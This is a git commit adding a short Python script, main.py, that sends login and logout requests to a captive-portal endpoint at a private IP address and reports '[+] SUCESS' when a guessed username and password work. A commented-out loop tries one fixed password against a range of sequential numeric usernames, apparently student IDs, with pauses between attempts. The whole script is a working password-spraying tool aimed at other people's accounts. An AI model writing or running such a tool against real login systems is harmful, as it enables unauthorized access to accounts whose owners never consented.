d0ec4d6ac2c539539ae9929e1e4e6a86f3f2e923
Akshit Tyagi <tyagiakshit833@gmail.com>
2022-07-22 16:49:39 +0530

    add main w one pass

---
+++ main.py
@@ -0,0 +1,21 @@
+import requests, time
+
+url = "http://172.16.68.6:8090/login.xml"
+
+def login(user, passwd):
+    req = {'mode': '191', 'username': user, 'password': passwd}
+    x = requests.post(url, data=req)
+    if x.text[90] == 'Y':
+        return f'[+] SUCESS User = {user}, Pass = {passwd}'
+    else:
+        return '[-] Failure :('
+
+def logout(user):
+    req = {'mode': '193', 'username': user}
+    x = requests.post(url, data=req)
+
+# for en in range(21103000, 21103100):
+#     print(login(en, "357043AR"))
+#     time.sleep(2)
+#     logout(en)
+#     time.sleep(1)
